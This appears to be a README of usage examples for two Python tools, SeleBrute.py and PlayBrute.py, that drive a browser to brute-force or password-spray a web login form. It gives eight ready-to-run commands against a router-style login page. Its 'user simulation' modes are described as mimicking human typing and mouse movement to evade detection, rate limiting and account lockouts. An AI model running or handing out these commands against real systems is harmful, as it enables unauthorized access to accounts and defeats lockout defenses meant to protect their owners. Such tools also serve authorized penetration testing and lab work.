# Command Usage Examples

## `SeleBrute.py` (Selenium)

These commands require a WebDriver (`chromedriver` or `geckodriver`) specified with the `--driver-path` argument.

### Brute Force (Fast Mode)

Quickly attempts many passwords for a single user. Best for offline labs or systems without lockout policies.

```bash
python3 SeleBrute.py \
  --driver-path "/path/to/your/chromedriver" \
  --browser "chrome" \
  --url "http://192.168.1.1/index.php" \
  --username "admin" \
  --passwords-file "/path/to/your/passwords.txt" \
  --username-locator-strategy "id" \
  --username-locator-value "fm_usr" \
  --password-locator-strategy "id" \
  --password-locator-value "fm_pwd" \
  --loginbutton-locator-strategy "xpath" \
  --loginbutton-locator-value "//button" \
  --headless
```

### Brute Force (User Simulation Mode)

Slower and more deliberate, this mode mimics human behavior (typing, mouse movement, random waits) to avoid detection.

```bash
python3 SeleBrute.py \
  --driver-path "/path/to/your/chromedriver" \
  --browser "chrome" \
  --url "http://192.168.1.1/index.php" \
  --username "admin" \
  --passwords-file "/path/to/your/passwords.txt" \
  --username-locator-strategy "id" \
  --username-locator-value "fm_usr" \
  --password-locator-strategy "id" \
  --password-locator-value "fm_pwd" \
  --loginbutton-locator-strategy "xpath" \
  --loginbutton-locator-value "//button" \
  --simulate-user \
  --headless
```

### Password Spray (Fast Mode)

Quickly attempts a single, common password against a long list of usernames.

```bash
python3 SeleBrute.py \
  --driver-path "/path/to/your/chromedriver" \
  --browser "chrome" \
  --url "http://192.168.1.1/index.php" \
  --usernames-file "/path/to/your/users.txt" \
  --password "Winter2025!" \
  --username-locator-strategy "id" \
  --username-locator-value "fm_usr" \
  --password-locator-strategy "id" \
  --password-locator-value "fm_pwd" \
  --loginbutton-locator-strategy "xpath" \
  --loginbutton-locator-value "//button" \
  --headless
```

### Password Spray (User Simulation Mode)

A slower, more stealthy password spray that is less likely to trigger rate limiting or account lockouts.

```bash
python3 SeleBrute.py \
  --driver-path "/path/to/your/chromedriver" \
  --browser "chrome" \
  --url "http://192.168.1.1/index.php" \
  --usernames-file "/path/to/your/users.txt" \
  --password "Winter2025!" \
  --username-locator-strategy "id" \
  --username-locator-value "fm_usr" \
  --password-locator-strategy "id" \
  --password-locator-value "fm_pwd" \
  --loginbutton-locator-strategy "xpath" \
  --loginbutton-locator-value "//button" \
  --simulate-user \
  --headless
```

---

## `PlayBrute.py` (Playwright)

These commands do **not** require a `--driver-path` argument, as Playwright manages its own browser binaries.

### Brute Force (Fast Mode)

Quickly attempts many passwords for a single user.

```bash
python3 PlayBrute.py \
  --browser "chromium" \
  --url "http://192.168.1.1/index.php" \
  --username "admin" \
  --passwords-file "/path/to/your/passwords.txt" \
  --username-locator-strategy "id" \
  --username-locator-value "fm_usr" \
  --password-locator-strategy "id" \
  --password-locator-value "fm_pwd" \
  --loginbutton-locator-strategy "xpath" \
  --loginbutton-locator-value "//button" \
  --headless
```

### Brute Force (User Simulation Mode)

Slower and more deliberate, this mode mimics human behavior to avoid detection.

```bash
python3 PlayBrute.py \
  --browser "chromium" \
  --url "http://192.168.1.1/index.php" \
  --username "admin" \
  --passwords-file "/path/to/your/passwords.txt" \
  --username-locator-strategy "id" \
  --username-locator-value "fm_usr" \
  --password-locator-strategy "id" \
  --password-locator-value "fm_pwd" \
  --loginbutton-locator-strategy "xpath" \
  --loginbutton-locator-value "//button" \
  --simulate-user \
  --headless
```

### Password Spray (Fast Mode)

Quickly attempts a single, common password against a long list of usernames.

```bash
python3 PlayBrute.py \
  --browser "chromium" \
  --url "http://192.168.1.1/index.php" \
  --usernames-file "/path/to/your/users.txt" \
  --password "Winter2025!" \
  --username-locator-strategy "id" \
  --username-locator-value "fm_usr" \
  --password-locator-strategy "id" \
  --password-locator-value "fm_pwd" \
  --loginbutton-locator-strategy "xpath" \
  --loginbutton-locator-value "//button" \
  --headless
```

### Password Spray (User Simulation Mode)

A slower, more stealthy password spray that is less likely to trigger account lockouts.

```bash
python3 PlayBrute.py \
  --browser "chromium" \
  --url "http://192.168.1.1/index.php" \
  --usernames-file "/path/to/your/users.txt" \
  --password "Winter2025!" \
  --username-locator-strategy "id" \
  --username-locator-value "fm_usr" \
  --password-locator-strategy "id" \
  --password-locator-value "fm_pwd" \
  --loginbutton-locator-strategy "xpath" \
  --loginbutton-locator-value "//button" \
  --simulate-user \
  --headless
```